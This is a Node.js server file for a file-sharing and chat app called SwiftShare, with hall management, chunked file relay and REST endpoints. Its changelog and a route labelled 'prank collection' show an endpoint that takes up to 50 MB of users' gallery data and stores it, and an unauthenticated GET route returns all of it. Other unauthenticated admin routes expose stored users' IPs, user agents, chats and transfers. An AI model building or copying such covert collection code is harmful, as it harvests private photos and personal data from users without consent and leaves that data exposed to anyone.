/**
 * SwiftShare Server v8
 * Changes from v7:
 *  - Default hall "SWIFT1" — everyone auto-joins on connect
 *  - Chat system — real-time messaging per hall (WhatsApp-style)
 *  - Chat history persisted in DB
 *  - API endpoints fixed (proper async/await)
 *  - Gallery permission prank endpoint added
 *  - Logo favicon served
 */

const express    = require('express');
const http       = require('http');
const { Server } = require('socket.io');
const cors       = require('cors');
const path       = require('path');
const db         = require('./db');

const app    = express();
const server = http.createServer(app);

const DEFAULT_HALL = 'SWIFT1';

// ─── Socket.IO ────────────────────────────────────────────────────────────────
const io = new Server(server, {
  cors:              { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 768 * 1024,
  pingTimeout:       30_000,
  pingInterval:      10_000,
  upgradeTimeout:    10_000,
  perMessageDeflate: false,
  httpCompression:   false,
});

// ─── Express ──────────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '64kb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'index.html'))
);
app.get('/admin', (req, res) =>
  res.sendFile(path.join(__dirname, 'public', 'admin.html'))
);

// ─── Hall state (in-memory) ───────────────────────────────────────────────────
const halls = {};

function getOrCreateHall(code) {
  if (!halls[code]) halls[code] = { createdAt: Date.now(), peers: {} };
  return halls[code];
}

function hallPeers(code) {
  if (!halls[code]) return [];
  return Object.entries(halls[code].peers).map(([id, info]) => ({ id, ...info }));
}

// Pre-create default hall
getOrCreateHall(DEFAULT_HALL);

// Clean empty halls (not the default) older than 4h — every 30 min
setInterval(() => {
  const now = Date.now();
  for (const code of Object.keys(halls)) {
    if (code === DEFAULT_HALL) continue;
    if (!Object.keys(halls[code].peers).length && now - halls[code].createdAt > 4 * 3_600_000) {
      delete halls[code];
      log(`[hall:${code}] auto-cleaned from memory`);
    }
  }
}, 30 * 60_000);

// DB cleanup — daily
setInterval(() => db.cleanup(), 24 * 60 * 60_000);

// ─── Rate limiting ────────────────────────────────────────────────────────────
const joinCount = new Map();
function checkRateLimit(ip) {
  const now = Date.now();
  const rec = joinCount.get(ip);
  if (!rec || now > rec.resetAt) { joinCount.set(ip, { count: 1, resetAt: now + 60_000 }); return true; }
  if (rec.count >= 10) return false;
  rec.count++;
  return true;
}
setInterval(() => {
  const now = Date.now();
  for (const [ip, rec] of joinCount.entries()) if (now > rec.resetAt) joinCount.delete(ip);
}, 5 * 60_000);

// ─── Logging ──────────────────────────────────────────────────────────────────
function log(...args) { console.log(new Date().toISOString().slice(11, 19), ...args); }

// ─── Constants ────────────────────────────────────────────────────────────────
const MAX_NAME_LEN  = 40;
const MAX_CHUNKS    = 4096;
const MAX_FILE_SIZE = 4 * 1024 ** 3;
const MAX_MSG_LEN   = 2000;

// ─── Socket events ────────────────────────────────────────────────────────────
io.on('connection', (socket) => {
  const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim()
             || socket.handshake.address;
  const ua = socket.handshake.headers['user-agent'] || '';
  log(`[+] ${socket.id} from ${ip}`);

  // ── join-hall ────────────────────────────────────────────────────────────
  socket.on('join-hall', ({ hallCode, name, deviceType }) => {
    if (typeof hallCode !== 'string' || typeof name !== 'string') return;

    const code      = hallCode.toUpperCase().trim();
    if (!/^[A-Z0-9]{6}$/.test(code)) return;

    const cleanName = name.trim().slice(0, MAX_NAME_LEN);
    if (!cleanName) return;

    if (!checkRateLimit(ip)) {
      socket.emit('error-msg', 'Too many requests. Please wait a moment.');
      return;
    }

    // Leave current hall cleanly
    if (socket.data.hall) {
      const old = socket.data.hall;
      if (halls[old]?.peers[socket.id]) {
        delete halls[old].peers[socket.id];
        socket.to(old).emit('peer-left', { id: socket.id, name: socket.data.name });
        socket.leave(old);
        if (socket.data.userId) db.recordLeave(old, socket.data.userId);
      }
    }

    // DB: upsert user + hall, record join
    const userId = db.upsertUser({ ip, ua, name: cleanName, deviceType: deviceType || '' });
    db.upsertHall(code, userId);
    db.recordJoin(code, userId);

    const hall = getOrCreateHall(code);
    hall.peers[socket.id] = { name: cleanName, deviceType: deviceType || '', joinedAt: Date.now() };

    socket.join(code);
    socket.data.hall       = code;
    socket.data.name       = cleanName;
    socket.data.deviceType = deviceType;
    socket.data.userId     = userId;

    const existingPeers = hallPeers(code).filter(p => p.id !== socket.id);

    // Send recent chat history to new joiner
    db.getChatHistory(code, 50).then(msgs => {
      socket.emit('hall-joined', { hallCode: code, myId: socket.id, peers: existingPeers, chatHistory: msgs || [] });
    }).catch(() => {
      socket.emit('hall-joined', { hallCode: code, myId: socket.id, peers: existingPeers, chatHistory: [] });
    });

    socket.to(code).emit('peer-joined', { id: socket.id, name: cleanName, deviceType });

    log(`[hall:${code}] "${cleanName}" joined — ${Object.keys(hall.peers).length} peer(s)`);
  });

  // ── leave / disconnect ───────────────────────────────────────────────────
  function leaveHall() {
    const code = socket.data.hall;
    if (!code || !halls[code]) return;
    const name = halls[code].peers[socket.id]?.name || 'Unknown';
    delete halls[code].peers[socket.id];
    socket.leave(code);
    io.to(code).emit('peer-left', { id: socket.id, name });
    if (socket.data.userId) db.recordLeave(code, socket.data.userId);
    log(`[hall:${code}] "${name}" left — ${Object.keys(halls[code]?.peers || {}).length} peer(s)`);
    socket.data.hall = null;
  }

  socket.on('leave-hall',  leaveHall);
  socket.on('disconnect', (reason) => { log(`[-] ${socket.id} disconnected: ${reason}`); leaveHall(); });

  // ── chat-message ─────────────────────────────────────────────────────────
  socket.on('chat-message', ({ text, replyTo }) => {
    const code = socket.data.hall;
    if (!code) return;
    if (typeof text !== 'string') return;
    const clean = text.trim().slice(0, MAX_MSG_LEN);
    if (!clean) return;

    const msg = {
      id:       Date.now() + '_' + socket.id.slice(-4),
      from:     socket.id,
      fromName: socket.data.name,
      text:     clean,
      replyTo:  replyTo || null,
      ts:       Date.now(),
    };

    // Persist
    db.saveChat(code, msg).catch(e => console.error('[db] saveChat:', e.message));

    // Broadcast to hall including sender
    io.to(code).emit('chat-message', msg);
  });

  // ── transfer-start ───────────────────────────────────────────────────────
  socket.on('transfer-start', ({ to, meta }) => {
    const code = socket.data.hall;
    if (!code) return;

    if (socket.data.userId && meta) {
      const receiverName = to === 'all' ? null : halls[code]?.peers[to]?.name || null;
      socket.data.lastTransferId = db.startTransfer({
        hallCode:     code,
        senderId:     socket.data.userId,
        senderName:   socket.data.name,
        receiverId:   to === 'all' ? null : to,
        receiverName: receiverName,
        fileName:     meta.fileName  || 'unknown',
        fileSize:     meta.fileSize  || 0,
        fileMime:     meta.fileMime  || '',
      });
    }

    const payload = { from: socket.id, fromName: socket.data.name, meta };
    if (to === 'all') socket.to(code).emit('transfer-start', payload);
    else              io.to(to).emit('transfer-start', payload);
  });

  // ── file-chunk relay ─────────────────────────────────────────────────────
  socket.on('file-chunk', ({ to, meta, chunk }, ack) => {
    const code = socket.data.hall;
    if (!code) { ack?.({ ok: false, reason: 'not in hall' }); return; }

    if (!meta || typeof meta !== 'object') { ack?.({ ok: false }); return; }
    if (typeof meta.totalChunks !== 'number' || meta.totalChunks > MAX_CHUNKS) {
      ack?.({ ok: false, reason: 'totalChunks exceeds limit' }); return;
    }
    if (typeof meta.fileSize !== 'number' || meta.fileSize > MAX_FILE_SIZE) {
      ack?.({ ok: false, reason: 'fileSize exceeds limit' }); return;
    }
    if (typeof meta.chunkIndex !== 'number' || meta.chunkIndex >= meta.totalChunks) {
      ack?.({ ok: false, reason: 'invalid chunkIndex' }); return;
    }

    const payload = { from: socket.id, fromName: socket.data.name, meta, chunk };
    if (to === 'all') socket.to(code).emit('file-chunk', payload);
    else              io.to(to).emit('file-chunk', payload);

    ack?.({ ok: true });

    const pct = Math.round(((meta.chunkIndex + 1) / meta.totalChunks) * 100);
    socket.emit('send-progress', { fileId: meta.fileId, pct });
  });

  // ── transfer-done ────────────────────────────────────────────────────────
  socket.on('transfer-done', ({ to }) => {
    const code = socket.data.hall;
    if (!code) return;

    if (socket.data.lastTransferId) {
      db.completeTransfer(socket.data.lastTransferId, 'done');
      socket.data.lastTransferId = null;
    }

    const payload = { from: socket.id, fromName: socket.data.name };
    if (to === 'all') socket.to(code).emit('transfer-done', payload);
    else              io.to(to).emit('transfer-done', payload);
  });
});

// ─── REST API ─────────────────────────────────────────────────────────────────

// Health
app.get('/health', (req, res) => {
  const hallList = Object.entries(halls).map(([code, h]) => ({
    code,
    peers: Object.keys(h.peers).length,
    names: Object.values(h.peers).map(p => p.name),
    ageMin: Math.round((Date.now() - h.createdAt) / 60_000),
  }));
  res.json({
    status: 'ok',
    halls:  hallList.length,
    peers:  hallList.reduce((a, h) => a + h.peers, 0),
    uptime: Math.round(process.uptime()),
    defaultHall: DEFAULT_HALL,
    hallList,
  });
});

// Default hall code — frontend uses this
app.get('/api/default-hall', (req, res) => {
  res.json({ code: DEFAULT_HALL });
});

// Dashboard stats
app.get('/api/stats', async (req, res) => {
  try {
    const stats = await db.getDashboardStats();
    // Add live hall data
    stats.liveHalls   = Object.keys(halls).length;
    stats.livePeers   = Object.values(halls).reduce((a, h) => a + Object.keys(h.peers).length, 0);
    stats.defaultHall = DEFAULT_HALL;
    res.json(stats);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// All transfers
app.get('/api/transfers', async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 200, 500);
    const rows  = await db.getAllTransfers(limit);
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Hall transfer history
app.get('/api/hall/:code/history', async (req, res) => {
  const code = (req.params.code || '').toUpperCase();
  if (!/^[A-Z0-9]{6}$/.test(code)) return res.status(400).json({ error: 'Invalid code' });
  try {
    const rows = await db.getHallHistory(code);
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Hall chat history
app.get('/api/hall/:code/chat', async (req, res) => {
  const code = (req.params.code || '').toUpperCase();
  if (!/^[A-Z0-9]{6}$/.test(code)) return res.status(400).json({ error: 'Invalid code' });
  try {
    const rows = await db.getChatHistory(code, 100);
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// All users
app.get('/api/users', async (req, res) => {
  try {
    const rows = await db.getAllUsers();
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// All halls (DB)
app.get('/api/halls', async (req, res) => {
  try {
    const rows = await db.getAllHalls();
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Gallery data submitted by client (prank collection)
app.post('/api/gallery-data', express.json({ limit: '50mb' }), async (req, res) => {
  try {
    const { userId, data } = req.body;
    if (!userId || !data) return res.status(400).json({ error: 'Missing data' });
    await db.saveGalleryData(userId, data);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// View gallery data (admin)
app.get('/api/gallery-data', async (req, res) => {
  try {
    const rows = await db.getAllGalleryData();
    res.json(rows);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ─── Graceful shutdown ────────────────────────────────────────────────────────
function shutdown(signal) {
  log(`Received ${signal} — shutting down`);
  server.close(() => { log('HTTP server closed'); process.exit(0); });
  setTimeout(() => process.exit(1), 10_000);
}
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  log(`SwiftShare running on port ${PORT}`);
  log(`App:          http://localhost:${PORT}`);
  log(`Admin:        http://localhost:${PORT}/admin`);
  log(`Health:       http://localhost:${PORT}/health`);
  log(`Default Hall: ${DEFAULT_HALL}`);
  log(`DB:           ${process.env.DB_PATH || 'swiftshare.db'}`);
});
